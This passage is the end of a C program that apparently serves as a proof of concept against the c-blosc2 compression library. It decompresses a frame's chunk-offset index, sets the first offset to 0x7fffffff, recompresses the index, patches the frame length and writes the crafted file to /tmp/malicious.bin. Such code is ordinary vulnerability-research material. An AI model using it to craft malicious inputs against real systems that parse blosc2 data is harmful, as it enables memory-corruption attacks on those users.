  uint8_t* coffsets = sframe + header_len + cbytes;
  size_t coffsets_cbytes = len - (header_len + cbytes) - 30; // trailer is 30 bytes
  printf("coffsets at offset %d, cbytes=%zu\n", header_len + (int)cbytes, coffsets_cbytes);

  // Decompress the offsets
  int64_t* offsets = malloc(nchunks * 8);
  blosc2_dparams dparams = BLOSC2_DPARAMS_DEFAULTS;
  blosc2_context* dctx = blosc2_create_dctx(dparams);
  int32_t off_nbytes = blosc2_decompress_ctx(dctx, coffsets, coffsets_cbytes, offsets, nchunks * 8);
  blosc2_free_ctx(dctx);
  printf("decompressed offsets: %d bytes\n", off_nbytes);
  for (int i = 0; i < nchunks; i++) {
    printf("  offset[%d] = %lld\n", i, (long long)offsets[i]);
  }

  // Modify the first offset to be a large value
  offsets[0] = 0x7fffffff;  // large offset

  // Recompress the offsets
  uint8_t* new_off_chunk = malloc(nchunks * 8 + BLOSC_MAX_OVERHEAD);
  blosc2_cparams off_cparams = BLOSC2_CPARAMS_DEFAULTS;
  off_cparams.typesize = 8;
  blosc2_context* cctx = blosc2_create_cctx(off_cparams);
  int32_t new_off_cbytes = blosc2_compress_ctx(cctx, offsets, nchunks * 8, new_off_chunk, nchunks * 8 + BLOSC_MAX_OVERHEAD);
  blosc2_free_ctx(cctx);
  printf("new offsets chunk cbytes: %d\n", new_off_cbytes);

  // Build the new frame
  int64_t new_len = header_len + cbytes + new_off_cbytes + 30;
  uint8_t* new_frame = malloc(new_len);
  memcpy(new_frame, sframe, header_len + cbytes);
  memcpy(new_frame + header_len + cbytes, new_off_chunk, new_off_cbytes);

  // Update the frame length in the header
  // The frame_len field is at offset FRAME_LEN (16), stored as int64 little-endian
  memcpy(new_frame + FRAME_LEN, &new_len, 8);

  // Write the trailer (30 bytes, same as original)
  memcpy(new_frame + header_len + cbytes + new_off_cbytes, sframe + len - 30, 30);

  FILE* f = fopen("/tmp/malicious.bin", "wb");
  fwrite(new_frame, 1, new_len, f);
  fclose(f);
  printf("wrote %lld bytes to /tmp/malicious.bin\n", (long long)new_len);

  free(offsets);
  free(new_off_chunk);
  free(new_frame);
  blosc2_schunk_free(schunk);
  blosc_destroy();
  return 0;
}
